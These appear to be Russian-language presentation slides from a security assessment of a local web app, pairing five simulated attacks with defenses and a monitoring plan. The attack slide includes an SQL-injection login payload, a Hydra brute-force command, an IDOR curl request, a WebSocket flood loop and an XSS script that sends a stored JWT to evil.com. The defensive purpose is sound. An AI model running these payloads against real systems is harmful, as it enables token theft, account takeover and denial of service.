## Слайд 7: Сценарии кибератак (моделирование)

### 5 смоделированных сценариев

#### 1. SQL-инъекция через `/auth/login`

```bash
# Тестовая инъекция
{"username": "admin' OR '1'='1", "password": "any"}

# Автоматизация с SQLMap
python sqlmap_automation.py
```

#### 2. Брутфорс атака (Hydra)

```bash
hydra -l admin -P passwords.txt localhost -s 3001 \
  http-post-form "/auth/login:..."
```

#### 3. XSS в сообщениях чата

```html
<!-- Кража JWT токена -->
<script>
  fetch("https://evil.com/steal?token=" + localStorage.getItem("jwt"));
</script>
```

#### 4. IDOR (доступ к чужим ресурсам)

```bash
# Пользователь A пытается получить данные пользователя B
curl -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/users/2
```

#### 5. DoS на WebSocket

```python
# Флуд 10 000 подключениями
async def flood():
    for i in range(10000):
        await websockets.connect('ws://localhost:3001')
```

## Слайд 8: Меры защиты (рекомендации)

### Критический приоритет (1-3 дня)

1. **Rate Limiting**

```typescript
ThrottlerModule.forRoot({
  ttl: 900, // 15 минут
  limit: 5, // 5 попыток на /auth/login
});
```

2. **SQL-инъекции - параметризованные запросы**

```typescript
// ✅ ПРАВИЛЬНО:
const user = await repository.findOne({ where: { username } });

// ❌ НЕПРАВИЛЬНО:
const query = `SELECT * FROM users WHERE username='${username}'`;
```

3. **Удалить .env из Git**

```bash
git filter-branch --index-filter 'git rm --cached .env'
echo ".env" >> .gitignore
```

### Высокий приоритет (1-2 недели)

4. **IDOR - проверка прав доступа**

```typescript
if (req.user.id !== resourceOwnerId && !req.user.isAdmin) {
  throw new ForbiddenException();
}
```

5. **XSS - санитизация**

```typescript
// Backend: sanitize-html
import sanitizeHtml from 'sanitize-html';
const clean = sanitizeHtml(userInput, { allowedTags: [] });

// Frontend: DOMPurify + CSP
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## Слайд 9: Система мониторинга (план)

### Open-Source решения

**Wazuh** (рекомендуется):

```yaml
# docker-compose.yml
services:
  wazuh:
    image: wazuh/wazuh:latest
    ports:
      - "1514:1514" # Syslog
      - "1515:1515" # Agent communication
      - "443:443" # Web UI
    volumes:
      - ./wazuh_config:/wazuh-config-mount
```

**Возможности**:

- Обнаружение вторжений (IDS)
- Мониторинг целостности файлов (FIM)
- Анализ логов безопасности
- Соответствие стандартам (PCI DSS, GDPR)

**Snort** (Network IDS):

```bash
# Установка
sudo apt install snort

# Правила для обнаружения SQL-инъекций
alert tcp any any -> $HOME_NET 3001 (msg:"SQL Injection Attempt"; \
  content:"OR"; content:"SELECT"; sid:1000001;)
```

**Zabbix** (Мониторинг инфраструктуры):

- CPU, память, диск
- Доступность API
- Время отклика
- Количество подключений
